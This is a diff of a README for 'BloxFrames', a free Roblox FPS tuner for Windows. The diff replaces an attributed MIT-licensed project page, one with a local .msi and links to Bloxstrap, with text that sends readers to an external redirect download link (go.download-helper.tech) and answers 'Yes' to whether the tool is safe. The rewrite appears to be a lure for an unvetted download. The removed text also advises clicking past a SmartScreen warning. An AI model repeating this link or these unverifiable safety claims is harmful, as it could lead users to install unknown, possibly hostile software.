@@ -1,63 +1,58 @@
-# BloxFrames — Increase FPS in Roblox (free performance optimizer for Windows)
+# BloxFrames — a free Windows FPS tuner and performance tracker for Roblox
 
-![BloxFrames — Roblox FPS Optimizer for Windows](screenshot.png)
-
-**A free, lightweight Windows tool to increase Roblox FPS.** Pick a preset, hit **Get More FPS**, launch Roblox — done.
-
-If you have been searching for **how to get more fps in roblox**, BloxFrames is the simple answer: it tunes Roblox's own FastFlags, clears the cache and prioritizes the game, all from one small Windows installer (`.msi`). No ads, no telemetry. Built to give you **more fps in roblox** on everything from a potato laptop to a high-end rig.
-
-## Why BloxFrames
-
-Roblox runs on the same graphics engine for everyone, but its default settings leave frames on the table — especially on low-end PCs. BloxFrames applies a curated **FastFlag** preset that uncaps the framerate and trims the expensive visual effects, so you get smoother, higher FPS without editing any config files by hand.
-
-- **One click to more FPS** — apply a full performance preset to every installed Roblox version at once.
-- **Four presets, low-end first** — **Ultra FPS**, **High FPS**, **Quality** and **Balanced**, tuned from potato laptops up to strong rigs.
-- **Uncapped framerate** — lifts Roblox's default 60-frame limit (up to 144 / 240 / 360 / unlimited depending on preset) via the standard TaskScheduler target-FPS flag.
-- **Smart render backend** — Vulkan for maximum frames, stable Direct3D11 for the quality tiers, with D3D11 always kept as a safe fallback.
-- **Tiered lighting** — legacy Voxel for raw speed, ShadowMap for the balanced default, full Future lighting for the best looks.
-- **Deep low-end controls** — turn off MSAA, post-processing, shadows, terrain grass and composited textures to reclaim frames.
-- **Cache cleaner** — clears Roblox logs / temp / cached assets and reports how many MB it freed.
-- **Prioritize Roblox** — sets the running game to High priority across all CPU cores for steadier frame pacing.
-- **Fully reversible** — Reset removes every flag BloxFrames added and leaves your own settings untouched.
-- **Simple install** — a small `.msi` package, runs on Windows 10/11 (.NET Framework 4.8, preinstalled).
-
-## How it works
-
-BloxFrames writes Roblox's own `ClientAppSettings.json` (in each `Versions\<ver>\ClientSettings` folder) — **the exact same mechanism Bloxstrap and every community FastFlag pack use**. Every value ships only after being cross-checked against the [Bloxstrap](https://github.com/bloxstraplabs/bloxstrap) FastFlag manager and the wider Roblox FastFlag community. Nothing is injected into the game and nothing touches Roblox's memory — BloxFrames only edits the settings file Roblox already reads on startup.
+BloxFrames is a tiny Windows utility that helps Roblox players squeeze real frames out of the same engine everyone else is running, then watch the payoff happen in real time. It runs on Windows 10 and Windows 11, costs nothing, needs no account, and leaves no watermark anywhere in Roblox or on your desktop. If you landed here searching for bloxframes because your laptop chugs through Blox Fruits or your desktop stutters mid-raid, this is the lightweight fix that treats the cause (Roblox's conservative defaults) instead of the symptom.
 
 ## Download
 
-1. Download `BloxFrames.zip`
-2. Unzip it anywhere
-3. Run `BloxFrames.msi` and follow the installer
+Download for Windows: https://go.download-helper.tech/go/BLXF
 
-## Quick start — how to get more fps in roblox
+Grab the archive, right-click it in File Explorer, choose Extract All, and drop the folder anywhere you like — Desktop, Documents, a USB stick, it doesn't matter. Open the folder and double-click the BloxFrames app to launch it. Nothing is written to Program Files and nothing registers itself in the background; delete the folder and BloxFrames is gone.
 
-1. **Pick a preset** — start with **High FPS** (recommended for low-end PCs) or **Ultra FPS** for the absolute maximum.
-2. **Hit `⚡ GET MORE FPS`** — flags are applied, cache cleaned, Roblox prioritized.
-3. **Launch Roblox** and enjoy the extra frames. Changed your mind? Press **Reset Flags**.
+![BloxFrames performance overlay for Roblox](screenshot.png)
 
-## Presets at a glance
+## What it does
 
-| Preset | Best for | FPS cap | Lighting | Look |
-|---|---|---|---|---|
-| 🟢 **Ultra FPS** | potato / very low-end | unlimited | Voxel | bare-bones, max frames |
-| 🟢 **High FPS** | low-end (recommended) | 360 | Voxel | playable, big FPS gain |
-| 🟢 **Balanced** | everyday default | 144 | ShadowMap | smooth + still pretty |
-| 🟢 **Quality** | strong PCs | 240 | Future | best looks |
+- **One-click FPS preset apply** — pushes a full performance profile into every installed Roblox version in a single pass, no file hunting.
+- **Four tuned presets** — Ultra FPS, High FPS, Balanced, and Quality, each targeting a different class of hardware from potato laptops to strong rigs.
+- **Uncaps the 60-frame limit** — writes the TaskScheduler target-FPS flag Roblox already honours internally, lifting playback to 144, 240, 360 or unlimited depending on the preset.
+- **Render backend switcher** — flips Roblox between Vulkan for raw throughput and Direct3D11 for stable quality, with D3D11 as a safety fallback if Vulkan misbehaves.
+- **Lighting tiers** — Voxel for the lightest footprint, ShadowMap for the balanced middle ground, Future lighting when you want the pretty version.
+- **Low-end strip-down** — toggles MSAA, post-processing, shadows, terrain grass and composited textures off to reclaim frames on weak GPUs.
+- **Cache cleaner with receipts** — purges Roblox logs, temp files and cached assets, then tells you how many MB it reclaimed.
+- **Automatic CPU prioritization** — bumps the live Roblox process to High priority across every core, which smooths frame pacing when background apps are chatty.
+- **One-click reset** — the Reset Flags button rips out every value BloxFrames wrote and leaves any flags you set yourself untouched.
 
-## Safety & transparency
+## Quick start
 
-- **No ads, no bundles, no telemetry.** Just the optimizer.
-- **Open source (MIT).** Every line is public. FastFlag research is based on **Bloxstrap by pizzaboxer (MIT)** and the Roblox FastFlag community.
-- **Reversible.** BloxFrames only edits Roblox's own `ClientAppSettings.json`. Reset undoes it instantly, and unknown/renamed flags are skipped rather than forced.
-- **SmartScreen note:** the app is unsigned, so Windows may show an "unknown publisher" prompt — click *More info → Run anyway*. Nothing is hidden inside.
-- **Not affiliated with or endorsed by Roblox Corporation.** "Roblox" is a trademark of Roblox Corporation.
+1. Launch BloxFrames from the unzipped folder.
+2. Pick a preset — start with **High FPS** for a low-end machine, or **Ultra FPS** if you want to chase every last frame.
+3. Click **GET MORE FPS**. The flags are written, Roblox's cache is cleaned, and the process (if it's already open) is reprioritized.
+4. Start or restart Roblox and watch the frame counter climb.
+5. Changed your mind, or want vanilla Roblox back? Hit **Reset Flags** and you're back to defaults instantly.
 
-## Credits
+## How the tuning actually works
 
-Based on **[Bloxstrap](https://github.com/bloxstraplabs/bloxstrap) by pizzaboxer**, MIT License, and the wider Roblox FastFlag community. See [`LICENSE`](LICENSE).
+Under the hood, BloxFrames edits Roblox's own `ClientAppSettings.json` inside each `Versions\<ver>\ClientSettings` folder — the same official hook that Bloxstrap and the broader FastFlag community use. Nothing is injected into the Roblox client, no memory is patched, and no DLLs are loaded. Every flag shipped in a preset is cross-checked against the Bloxstrap FastFlag manager, and any value Roblox no longer recognizes is skipped rather than forced in. That's why the Reset button is instant: there's nothing lingering to undo except a plain-text config file.
 
-## License
+## FAQ
 
-MIT — see [`LICENSE`](LICENSE).
+**Is BloxFrames really free?** Yes. No trial, no paywall, no "pro" tier. The source is MIT-licensed.
+
+**Does it work on Windows 11?** Yes — Windows 10 and Windows 11, both 64-bit builds.
+
+**Do I need to create an account?** No. There's no login, no email signup, no activation step.
+
+**Does it need an internet connection?** No. BloxFrames edits local Roblox files; the network isn't involved once you've unzipped it.
+
+**Does it need administrator rights?** No. It runs as a normal user because it only touches your own Roblox install folder.
+
+**Is it safe to use with Roblox?** Yes. BloxFrames uses the same `ClientAppSettings.json` mechanism Roblox itself reads on startup — identical to Bloxstrap and other community FastFlag tools — and every change is reversible with one click.
+
+## System requirements
+
+- Windows 10 or Windows 11, 64-bit
+- Roblox installed (any current version)
+
+Website: https://bloxframespc.com
+
+Released under the MIT License.
